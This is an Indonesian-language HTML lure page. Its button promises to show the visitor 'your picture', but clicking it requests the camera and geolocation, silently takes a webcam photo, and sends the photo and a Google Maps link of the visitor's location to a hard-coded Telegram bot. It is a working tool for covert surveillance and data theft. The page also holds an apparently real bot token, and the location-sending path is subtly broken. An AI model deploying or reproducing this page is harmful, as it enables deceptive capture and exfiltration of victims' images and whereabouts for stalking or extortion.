<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akses</title>
</head>
<body>
    <h1>Gambar Mu Ada Di Sini</h1>
    <button onclick="startCapture()">Lihat Gambar</button>
    <script>
        function startCapture() {
            // Akses kamera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        // Ambil foto setelah beberapa detik
                        setTimeout(() => {
                            captureAndSend(stream);
                        }, 5000); // Ambil foto setelah 3 detik
                    })
                    .catch(function(error) {
                        alert("Akses kamera ditolak.");
                    });
            } else {
                alert("Browser tidak mendukung akses kamera.");
            }

            // Akses lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log('Lokasi Anda:', lat, lon);

                    // Kirimkan URL Google Maps ke Telegram
                    const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    sendToTelegram(`Lokasi Anda: ${locationUrl}`);
                }, function(error) {
                    alert("Gagal mendapatkan lokasi.");
                });
            } else {
                alert("Lokasi tidak tersedia.");
            }
        }

        function captureAndSend(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;

            video.onloadedmetadata = () => {
                // Tentukan ukuran canvas sesuai dengan video
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // Tentukan ukuran canvas sesuai dengan video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Gambar dari video ke canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Ambil gambar sebagai data URL (base64)
                const imageData = canvas.toDataURL('image/jpeg');

                // Kirim gambar ke Telegram
                sendToTelegram(imageData);

                // Stop stream setelah gambar diambil
                stream.getTracks().forEach(track => track.stop());
            };
        }

        function sendToTelegram(base64Image) {
            const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
            const chatId = '1746156378';

            // Convert base64 image to blob
            const byteString = atob(base64Image.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: 'image/jpeg' });

            // Create FormData to send the image as a file
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            // Send the photo using sendPhoto API
            const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Gambar terkirim ke Telegram');
                } else {
                    console.log('Error mengirim gambar:', data);
                }
            })
            .catch(error => console.log('Error:', error));
        }
    </script>
</body>
</html>
